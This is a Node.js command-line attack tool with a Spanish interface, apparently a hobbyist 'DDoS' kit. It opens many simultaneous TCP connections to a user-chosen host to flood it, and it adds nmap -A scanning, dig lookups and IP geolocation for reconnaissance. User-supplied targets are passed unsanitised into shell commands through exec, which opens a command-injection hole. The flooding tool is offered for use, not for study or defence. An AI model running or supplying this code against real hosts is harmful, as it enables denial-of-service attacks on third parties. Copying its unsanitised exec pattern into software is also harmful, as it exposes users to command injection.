const net = require('net');
const rl = require('readline').createInterface({
  input: process.stdin,
  output: process.stdout
});

const async = require('async');
const axios = require('axios');
const lolcatjs = require('lolcatjs');
const { exec } = require('child_process');


const ddosAttack = async (url, numConnections, attackDuration) => {
try {
console.log(`Iniciando ataque DDoS...`);
const sockets = [];
for (let i = 0; i < numConnections; i++) {
const socket = new net.Socket();
socket.connect(80, url, () => {
console.log(`    
 ╭────────────────────────────────╮
 │ ⚠️ Conectado a ${url}   │
 ╰────────────────────────────────╯`);
});
socket.on('data', (data) => {
console.log(`Dato recibido de ${url}`);
});
socket.on('error', (err) => {
console.error(`Error: ${err}`);
});
sockets.push(socket);
}

setTimeout(() => {
console.log('Ataque finalizado');
sockets.forEach((socket) => socket.destroy());
}, attackDuration * 1000);
} catch (error) {
console.error(`Error: ${error}`);
}
};

const updateCode = async () => {
try {
console.log(`Actualizando código...`);
const exec = require('child_process').exec;
exec('git pull origin main', (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error}`);
} else {
console.log(`Código actualizado correctamente!`);
}
});
} catch (error) {
console.error(`Error: ${error}`);
}
};


const getInfo = async (ip) => {
try {
const command = `dig +nocmd ${ip} any +multiline`;
exec(command, (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error.message}`);
return;
}
const lines = stdout.trim().split(String.raw`
`);
const details = [];
for (const line of lines) {
if (line.includes(';; ANSWER SECTION:')) {
details.push('** ANSWER SECTION **');
} else if (line.includes(';')) {
const [key, value] = line.split(';');
details.push(`  ${key.trim()}: ${value.trim()}`);
} else {
const parts = line.split(/\s+/);
const recordType = parts[3];
const ttl = parts[1];
const value = parts[4];
switch (recordType) {
case 'A':
details.push(`  IP Address: ${value} (TTL: ${ttl} seconds)`);
break;
case 'AAAA':
details.push(`  IPv6 Address: ${value} (TTL: ${ttl} seconds)`);
break;
case 'NS':
details.push(`  Name Server: ${value} (TTL: ${ttl} seconds)`);
break;
case 'MX':
details.push(`  Mail Server: ${value} (TTL: ${ttl} seconds)`);
break;
case 'SOA':
details.push(`  Start of Authority: ${value} (TTL: ${ttl} seconds)`);
break;
default:
details.push(`  Unknown Record Type: ${recordType} (TTL: ${ttl} seconds)`);
}
}
}
console.log(` DNS Information for ${ip}:`);
console.log(`---------------------------`);
console.log(details.join(String.raw`
`));
console.log(`---------------------------`);
});
} catch (error) {
console.error(`Error: ${error.message}`);
}
};


const analyzeIP = async (ip) => {
try {
const command = `nmap -A -T4 ${ip}`;
exec(command, (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error.message}`);
return;
}
const lines = stdout.trim().split(String.raw`
`);

let openPorts = [];
let services = {};
let os = '';
let deviceType = '';
let uptime = '';
let tcpSequence = '';
let ipIdSequence = '';
let osCPE = '';
let osGeneration = '';

lines.forEach((line) => {
const parts = line.trim().split(/ +/);
if (parts.length > 3 && parts[1] === 'open') {
const port = parts[0];
const state = parts[1];
const service = parts[2];
const version = parts.slice(3).join(' ');
openPorts.push({ port, state, service, version });
services[port] = service;
} else if (parts[0] === 'OS:') {
os = parts.slice(1).join(' ');
} else if (parts[0] === 'CPE:') {
osCPE = parts.slice(1).join(' ');
} else if (parts[0] === 'Device') {
deviceType = parts.slice(2).join(' ');
} else if (parts[0] === 'Uptime:') {
uptime = parts.slice(1).join(' ');
} else if (parts[0] === 'TCP') {
tcpSequence = parts.slice(3).join(' ');
} else if (parts[0] === 'IP') {
ipIdSequence = parts.slice(3).join(' ');
} else if (parts[0] === 'OS') {
osGeneration = parts.slice(2).join(' ');
}
});

console.log(`Nmap scan report for ${ip}`);
console.log(`Host is up.
`);

console.log(`PORT      STATE SERVICE    VERSION`);
openPorts.forEach((port) => {
console.log(`${port.port}      ${port.state} ${port.service}    ${port.version}`);
});

console.log(`
Service Info:`);
console.log(`OS: ${os} (${osCPE})`);
console.log(`Device type: ${deviceType}`);
console.log(`Uptime: ${uptime}`);
console.log(`TCP Sequence Prediction: ${tcpSequence}`);
console.log(`IP ID Sequence Generation: ${ipIdSequence}`);
console.log(`OS Generation: ${osGeneration}`);

console.log(`
`);
});
} catch (error) {
console.error(`Error: ${error.message}`);
}
};






const getGeoIP = async (ip) => {
try {
const response = await axios.get(`http://ip-api.com/json/${ip}`);
const data = response.data;
console.log(` `);
console.log(`      
        ╭─────────────────────────╮
        │ 🌕 Información de la IP │
        ╰─────────────────────────╯`);
console.log(`IP: ${data.query}`);
console.log(`Estatus: ${data.status}`);
console.log(`Continente: ${data.continent}`);
console.log(`Código del continente: ${data.continentCode}`);
console.log(`País: ${data.country}`);
console.log(`Código del país: ${data.countryCode}`);
console.log(`Región: ${data.region}`);
console.log(`Estado: ${data.regionName}`);
console.log(`Ciudad: ${data.city}`);
console.log(`Distrito: ${data.district}`);
console.log(`Código postal: ${data.zip}`);
console.log(`Latitud: ${data.lat}`);
console.log(`Longitud: ${data.lon}`);
console.log(`Zona horaria: ${data.timezone}`);
console.log(`Offset: ${data.offset}`);
console.log(`Moneda: ${data.currency}`);
console.log(`ISP: ${data.isp}`);
console.log(`Empresa: ${data.org}`);
console.log(`AS: ${data.as}`);
console.log(`Nombre de AS: ${data.asname}`);
console.log(`Es un celular: ${data.mobile}`);
console.log(`Es un proxy: ${data.proxy}`);
console.log(`Es un hosting:${data.hosting}`);
} catch (error) {
console.error(`Error: ${error.message}`);
}
};


const showMenu = () => {
  console.clear();
  console.log('ATOMIC| lolcat')
  console.log('Desarrollado por Keiji821');
  console.log('                ');
  console.log('Iniciar ataque DDoS');
  console.log('Actualizar código');
  console.log('Configurar conexiones simultáneas');
  console.log('Aumentar potencia del ataque');
  console.log('Información de DNS para una dirección IP');
  console.log('Análisis de IP');
  console.log('Información geográfica de IP');
  console.log('               ');
  console.log('Salir');
  console.log('               ');
  rl.setPrompt('｢🌐｣➤ ');
  rl.prompt();
};


let numConnections = 100; // Número de conexiones simultaneas por defecto
let attackDuration = 60; // Duración del ataque por defecto


rl.on('line', (option) => {
switch (option.trim()) {
case '1':
console.log('Ingrese la URL del objetivo');
rl.question('URL/IP: ', (url) => {
if (url === '') {
console.log('Url o ip invalida');
showMenu();
} else {
ddosAttack(url, numConnections, attackDuration);
showMenu();
}
});
break;
case '2':
updateCode();
showMenu();
break;
case '3':
console.log('Ingrese el número de conexiones simultaneas');
rl.question('Conexiones: ', (conexiones) => {
if (conexiones === '') {
console.log('Valor invalido');
showMenu();
} else {
numConnections = parseInt(conexiones);
console.log(`Conexiones simultaneas establecidas en ${numConnections}`);
showMenu();
}
});
break;
case '4':
console.log('Ingrese la duración del ataque (en segundos)');
rl.question('Duración: ', (duration) => {
if (duration === '') {
console.log('Valor invalido');
showMenu();
} else {
attackDuration = parseInt(duration);
console.log(`Duración del ataque establecida en ${attackDuration} segundos`);
showMenu();
}
});
break;
case '5':
console.log('Ingrese la IP para obtener información');
rl.question('IP: ', (ip) => {
if (ip === '') {
console.log('IP invalida');
showMenu();
} else {
getInfo(ip);
showMenu();
}
});
break;
case '6':
console.log('Ingrese la ip o dominio para el análisis ');
rl.question('IP/Dominio: ', (ip) => {
if (ip === '') {
console.log('Ip o dominio invalido');
showMenu();
} else {
try {
analyzeIP(ip);
} catch (error) {
console.error(`Error al analizar IP: ${error.message}`);
}
showMenu();
}
});
break;
case '7':
console.log('Ingrese la ip o dominio para obtener información geográfica');
rl.question('IP/Dominio: ', (ip) => {
if (ip === '') {
console.log('Ip o dominio invalido');
showMenu();
} else {
getGeoIP(ip);
showMenu();
}
});
break;
case '0':
console.log('Saliendo...');
process.exit();
break;
default:
console.log('Opción invalida');
showMenu();
}
}).on('close', () => {
process.exit();
});